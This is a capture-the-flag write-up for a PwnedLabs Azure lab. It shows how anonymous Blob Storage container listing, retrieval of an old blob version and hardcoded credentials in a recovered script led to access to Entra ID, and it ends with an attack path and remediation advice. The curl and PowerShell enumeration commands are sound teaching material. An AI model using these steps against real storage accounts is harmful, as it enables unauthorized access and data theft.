
# Azure Blob Container to Initial Access

**Lab:** Mega Big Tech  
**Platform:** PwnedLabs  
**Starting point:** External, unauthenticated  
**Given:** `https://dev.megabigtech.com/$web/index.html`

## 1. What's hosting the website?

The URL leads to Azure Blob Storage. Let's confirm it from the response headers.

```powershell
Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head
```

<img width="1196" height="564" alt="2026-11-09_11-07" src="https://github.com/user-attachments/assets/d0ad473e-af3a-4a04-b259-8fd59ff4741f" />


To display just the headers:

```powershell
Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head | Select-Object -ExpandProperty Headers
```

`Windows-Azure-Blob/1.0` confirms Azure Blob Storage.

## 2. Can I list the container?

```text
https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list
```

<img width="1345" height="802" alt="2026-11-09_11-31" src="https://github.com/user-attachments/assets/b3466f74-f7ab-4a23-9925-beaa382510eb" />


Anonymous container listing works.

### Group blobs by prefix

```text
https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&delimiter=%2F
```

<img width="1122" height="595" alt="2026-11-09_11-32" src="https://github.com/user-attachments/assets/cb4a0000-b755-4d39-ac01-73d5836695f5" />

### List blobs under `static/`

```text
https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&prefix=static%2F
```
<img width="1264" height="740" alt="2026-11-09_11-32_1" src="https://github.com/user-attachments/assets/5bec2272-a871-4704-8329-d2abe82b0610" />




## 3. What about previous blob versions?

First attempt:

```text
https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions
```
<img width="1567" height="397" alt="Screenshot from 2026-11-09 17-09-29" src="https://github.com/user-attachments/assets/2a664622-304c-441b-859f-f6d401c3c0a6" />


Didn't return the expected versions.

Microsoft's Storage API supports version listing from `2019-12-12` onward, so specify that version:

```bash
curl -H "x-ms-version: 2019-12-12" \
'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions'
```

The XML is messy. Format it:

```bash
sudo apt install libxml2-utils

curl -H "x-ms-version: 2019-12-12" \
'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions' | xmllint --format - | less
```

<img width="887" height="624" alt="2026-11-09_11-36" src="https://github.com/user-attachments/assets/20985603-5e27-45e9-8cd9-745a25c8d2e5" />


Found a historical version of `scripts-transfer.zip`.

<img width="852" height="622" alt="2026-11-09_11-40" src="https://github.com/user-attachments/assets/61ab0072-1067-489e-a7d4-f2fc11c260bc" />


## 4. What's inside the ZIP?

Download the identified version in the lab:

```bash
curl -H "x-ms-version: 2019-12-12" \
'https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2025-08-07T21:08:03.6678148Z' \
-o scripts-transfer.zip
```
Inspect the archive:

<img width="613" height="368" alt="image" src="https://github.com/user-attachments/assets/d8effe96-479e-452c-95fe-869e69b5784d" />

```bash
unzip -l scripts-transfer.zip
```

Two PowerShell scripts were present.

One, `entra_users.ps1`, contained hardcoded credentials.

<img width="890" height="565" alt="creds found" src="https://github.com/user-attachments/assets/3a26f6a2-46bc-45a4-9dfc-73ae9f5a5338" />



## 5. Can I authenticate?

The lab's external MFA provider is compromised and automatically approves certain MFA challenges.

The discovered credentials were used in the authorized lab authentication flow.

The supplied `entra_users.ps1` script uses MSAL.PS and Microsoft Graph.

```powershell
Install-Module -Name MSAL.PS
./entra_users.ps1
```

<img width="899" height="98" alt="device login terminl" src="https://github.com/user-attachments/assets/a453fbb7-c00b-432e-b4a1-f153cabfd42a" />


Complete the device-code sign-in in the browser.

<img width="1229" height="714" alt="device login" src="https://github.com/user-attachments/assets/97b9c52c-f225-46fe-b27c-a297e9ca58e5" />



<img width="887" height="554" alt="cli in" src="https://github.com/user-attachments/assets/d9259e57-11f5-42b7-a5f1-dc05a6dd231e" />



The script returned Entra ID users.

## 6. What can I access through Azure PowerShell?

```powershell
Connect-AzAccount
```
<img width="1360" height="335" alt="azConnect" src="https://github.com/user-attachments/assets/3c8bb38f-33f9-424d-bf8e-74c414e1ddc7" />


Complete the browser sign-in and select the appropriate subscription.

<img width="790" height="595" alt="marcus log" src="https://github.com/user-attachments/assets/43b16b49-0648-4ebe-b837-15b8f4feeb98" />


Inspect the signed-in user:

```powershell
Get-AzADUser -SignedIn | Format-List
```

<img width="886" height="827" alt="last" src="https://github.com/user-attachments/assets/f2e6e6fd-e697-4d92-b560-298ece96b3d3" />


The required information(flag) was found in the user's directory properties.

**Lab completed.**

## 7. Attack path

```text
Public URL
    ↓
Azure Blob Storage
    ↓
Anonymous container listing
    ↓
Historical ZIP version
    ↓
Hardcoded credentials
    ↓
Authenticated Entra ID access
    ↓
Directory enumeration
    ↓
Lab objective
```

## 8. What went wrong?

- Anonymous container listing exposed blob metadata.
- A sensitive historical archive remained publicly accessible.
- Administrative credentials were hardcoded in PowerShell scripts.
- The compromised MFA provider allowed the lab's authentication flow.

**Fixes:** Restrict unnecessary public listing, remove exposed sensitive versions, rotate credentials, use proper secrets management, and remediate the compromised authentication provider.

---

*Ciao! 🤌*
